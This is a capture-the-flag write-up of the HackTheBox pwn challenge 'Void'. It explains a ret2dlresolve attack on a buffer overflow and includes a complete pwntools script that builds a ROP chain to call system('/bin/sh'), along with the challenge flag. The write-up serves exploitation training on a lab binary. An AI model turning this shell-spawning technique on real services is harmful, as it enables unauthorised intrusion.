# Void
> Write-up author: jon-brandy
## DESCRIPTION:
The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary - not stripped.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/051edd67-8036-4c74-bdbc-9f7a144140ec)

> No Canary Found, PARTIAL RELRO, NO PIE

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/883735c5-0bb9-4f85-9485-e5de52f1ce4e)


2. Let's decompile the binary with ghidra.
3. At the main() function, there's only one function called --> vuln()

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/c762cb32-c0fd-4976-b2af-6725b8c9965b)


4. At first, i assume that the chall must be related to `ret2libc` because there's no interesting function to return to.
5. But after checking the **Global Offset Table** turns out there are no `puts()`, `printf()`, or `write()` functions.
6. Then i realized it's a `ret2dlresolve` pwn challenge. It's a technique in pwn to manipulate the dyanmic linker's resolution process and redirect it to execute arbitrary code.
7. Actually it's `quite similiar` to overwrite GOT with format strings vuln.
8. Also we can utilize **pwntools** to automate the process to resolve the functions, because if we don't use pwntools, we need to construct 3 structures to fake.

```console
There're 3 structures we need to fake:
- STRTAB
- SYMTAB
- JMPREL
```

9. Here's the script i used to solve this:

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './void'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

padding = 72

rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.raw(asm('nop') * padding)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

sh.sendline(rop.chain())
sh.sendline(dlresolve.payload)

sh.interactive()
```

> LOCALLY

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/57498dbc-34a6-45b1-aa52-0c1c9568caf8)


10. Let's send it remotely.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/48407f72-6cd6-431d-a2ff-54578d5302a2)


11. Got the flag!

## FLAG

```
HTB{pwnt00l5_h0mep4g3_15_u54ful}
```
